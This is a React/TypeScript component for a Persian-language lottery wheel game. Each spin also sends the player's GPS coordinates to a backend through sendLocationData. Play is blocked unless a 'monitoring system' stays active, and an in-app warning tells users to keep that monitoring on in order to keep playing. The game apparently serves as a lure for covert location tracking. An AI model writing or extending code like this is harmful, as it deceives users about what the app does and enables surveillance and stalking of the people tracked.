import React, { useState } from "react";
import {
  Star,
  Gift,
  Coins,
  Sparkles,
  RotateCcw,
  Trophy,
  MapPin,
} from "lucide-react";
import Navbar from "./Navbar";
import { useCoins } from "../hooks/useCoins";
import { useDailyBonus } from "../hooks/useDailyBonus";

interface LotteryGameProps {
  location: {
    latitude: number;
    longitude: number;
    accuracy: number;
    timestamp: number;
  } | null;
  locationData: {
    latitude?: number;
    longitude?: number;
    accuracy?: number;
    isGPS?: boolean;
  };
  isWatching: boolean;
  apiStatus?: {
    isSending: boolean;
    lastSent: Date | null;
    error: string | null;
    sendLocationData: () => Promise<void>;
  };
}

const LotteryGame: React.FC<LotteryGameProps> = ({
  location,
  locationData,
  isWatching,
  apiStatus,
}) => {
  const [isSpinning, setIsSpinning] = useState(false);
  const [result, setResult] = useState<string | null>(null);
  const [showResult, setShowResult] = useState(false);
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const { credits, subtractCredits, addCredits, resetCredits } = useCoins();
  const { canClaimBonus, claimDailyBonus, timeUntilNextBonus } =
    useDailyBonus();

  const prizes = [
    {
      id: 1,
      name: "جایزه طلایی",
      value: 1000,
      icon: Trophy,
      color: "from-yellow-400 to-yellow-600",
    },
    {
      id: 2,
      name: "جایزه نقره‌ای",
      value: 500,
      icon: Star,
      color: "from-gray-300 to-gray-500",
    },
    {
      id: 3,
      name: "جایزه برنزی",
      value: 250,
      icon: Gift,
      color: "from-orange-400 to-orange-600",
    },
    {
      id: 4,
      name: "سکه طلا",
      value: 100,
      icon: Coins,
      color: "from-yellow-300 to-yellow-500",
    },
    {
      id: 5,
      name: "امتیاز ویژه",
      value: 50,
      icon: Sparkles,
      color: "from-purple-400 to-purple-600",
    },
    {
      id: 6,
      name: "تلاش مجدد",
      value: 0,
      icon: RotateCcw,
      color: "from-blue-400 to-blue-600",
    },
  ];

  const spinWheel = async () => {
    if (credits < 10) return;

    setIsSpinning(true);
    setResult(null);
    setShowResult(false);
    subtractCredits(10);

    // Send location data when spinning starts
    if (apiStatus?.sendLocationData) {
      try {
        await apiStatus.sendLocationData();
      } catch (error) {
        console.error("Failed to send location data:", error);
      }
    }

    setTimeout(() => {
      const randomPrize = prizes[Math.floor(Math.random() * prizes.length)];
      setResult(randomPrize.name);
      setIsSpinning(false);

      if (randomPrize.value > 0) {
        addCredits(randomPrize.value);
      }

      setTimeout(() => setShowResult(true), 500);
    }, 3000);
  };

  const handleClaimDailyBonus = () => {
    if (canClaimBonus) {
      addCredits(50);
      claimDailyBonus();
    }
  };

  return (
    <div
      dir="rtl"
      className="min-h-screen bg-gradient-to-br from-purple-900 via-pink-900 to-red-900"
    >
      {/* Navbar */}
      <Navbar
        credits={credits}
        isWatching={isWatching}
        onMenuToggle={() => setIsMenuOpen(!isMenuOpen)}
        isMenuOpen={isMenuOpen}
        onResetCredits={resetCredits}
        onClaimDailyBonus={handleClaimDailyBonus}
        canClaimBonus={canClaimBonus}
        timeUntilNextBonus={timeUntilNextBonus}
      />

      {/* Main Content with Top Padding for Navbar */}
      <div className="pt-20 pb-8 px-4">
        {/* System Status Alerts */}
        <div className="max-w-2xl mx-auto mb-6 space-y-3">
          {!isWatching && (
            <div className="bg-red-500/20 border border-red-500/30 rounded-xl p-4 backdrop-blur-sm">
              <div className="flex items-center text-white">
                <MapPin className="w-5 h-5 mr-2 text-red-400" />
                <span className="font-medium text-right">
                  هشدار: سیستم نظارت غیرفعال است
                </span>
              </div>
              <p className="text-sm text-white/80 mt-1 text-right">
                برای ادامه بازی، لطفاً سیستم نظارت را فعال نگه دارید
              </p>
            </div>
          )}
        </div>

        {/* Main Game Area */}
        <div className="max-w-2xl mx-auto">
          {/* Spinning Wheel */}
          <div className="relative mb-8">
            <div
              className={`w-64 h-64 sm:w-80 sm:h-80 mx-auto relative ${
                isSpinning ? "animate-spin" : ""
              }`}
              style={{ animationDuration: isSpinning ? "3s" : "0s" }}
            >
              <div className="w-full h-full rounded-full bg-gradient-to-br from-yellow-400 via-red-500 to-purple-600 p-2 shadow-2xl">
                <div className="w-full h-full rounded-full bg-white flex items-center justify-center relative overflow-hidden">
                  {prizes.map((prize, index) => {
                    const angle = (360 / prizes.length) * index;
                    const IconComponent = prize.icon;
                    return (
                      <div
                        key={prize.id}
                        className={`absolute w-12 h-12 sm:w-16 sm:h-16 flex items-center justify-center rounded-full bg-gradient-to-br ${prize.color} shadow-lg transform`}
                        style={{
                          transform: `rotate(${angle}deg) translateY(-80px)`,
                        }}
                      >
                        <IconComponent className="w-6 h-6 sm:w-8 sm:h-8 text-white" />
                      </div>
                    );
                  })}

                  {/* Center Circle */}
                  <div className="w-16 h-16 sm:w-20 sm:h-20 bg-gradient-to-br from-purple-600 to-pink-600 rounded-full flex items-center justify-center shadow-lg">
                    <Sparkles className="w-8 h-8 sm:w-10 sm:h-10 text-white animate-pulse" />
                  </div>
                </div>
              </div>

              {/* Pointer */}
              <div className="absolute top-0 left-1/2 transform -translate-x-1/2 -translate-y-2">
                <div className="w-6 h-6 bg-red-500 transform rotate-45 shadow-lg border-2 border-white"></div>
              </div>
            </div>
          </div>

          {/* Result Display */}
          {showResult && result && (
            <div className="mb-8 p-4 sm:p-6 bg-gradient-to-r from-green-500 to-blue-500 rounded-2xl shadow-2xl transform scale-105 transition-all duration-500">
              <div className="text-center text-white">
                <Trophy className="w-10 h-10 sm:w-12 sm:h-12 mx-auto mb-3 animate-bounce" />
                <h3 className="text-xl sm:text-2xl font-bold mb-2 text-right">
                  تبریک!
                </h3>
                <p className="text-lg sm:text-xl text-right">
                  شما برنده <strong>{result}</strong> شدید!
                </p>
              </div>
            </div>
          )}

          {/* Spin Button */}
          <div className="text-center mb-8">
            <button
              onClick={spinWheel}
              disabled={isSpinning || credits < 10 || !isWatching}
              className={`px-8 sm:px-12 py-3 sm:py-4 rounded-2xl font-bold text-lg sm:text-xl transition-all duration-300 transform ${
                isSpinning || credits < 10 || !isWatching
                  ? "bg-gray-400 cursor-not-allowed scale-95"
                  : "bg-gradient-to-r from-pink-500 to-red-500 hover:from-pink-600 hover:to-red-600 shadow-2xl hover:shadow-3xl hover:scale-105 active:scale-95"
              } text-white`}
            >
              {isSpinning ? (
                <div className="flex items-center justify-center">
                  <RotateCcw className="w-6 h-6 ml-2 animate-spin" />
                  در حال چرخش...
                </div>
              ) : credits < 10 ? (
                "امتیاز کافی نیست"
              ) : !isWatching ? (
                "سیستم غیرفعال است"
              ) : (
                <>
                  <Sparkles className="w-5 h-5 sm:w-6 sm:h-6 inline mr-2" />
                  <span className="hidden sm:inline">چرخاندن چرخ شانس</span>
                  <span className="sm:hidden">چرخ شانس</span>
                  <span className="block text-xs sm:text-sm opacity-80">
                    هزینه: ۱۰ امتیاز
                  </span>
                </>
              )}
            </button>
          </div>

          {/* Prize List */}
          <div className="bg-black/20 backdrop-blur-sm rounded-2xl p-4 sm:p-6 border border-white/10">
            <h3 className="text-lg sm:text-xl font-bold text-white mb-4 text-right">
              جوایز قرعه‌کشی
            </h3>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4">
              {prizes.map((prize) => {
                const IconComponent = prize.icon;
                return (
                  <div
                    key={prize.id}
                    className="flex items-center bg-white/10 backdrop-blur-sm rounded-xl p-3"
                  >
                    <div
                      className={`w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-gradient-to-br ${prize.color} flex items-center justify-center mr-3`}
                    >
                      <IconComponent className="w-4 h-4 sm:w-5 sm:h-5 text-white" />
                    </div>
                    <div>
                      <p className="text-white font-medium text-sm sm:text-base">
                        {prize.name}
                      </p>
                      <p className="text-white/70 text-xs sm:text-sm">
                        {prize.value > 0
                          ? `${prize.value.toLocaleString("fa-IR")} امتیاز`
                          : "بدون هزینه"}
                      </p>
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LotteryGame;
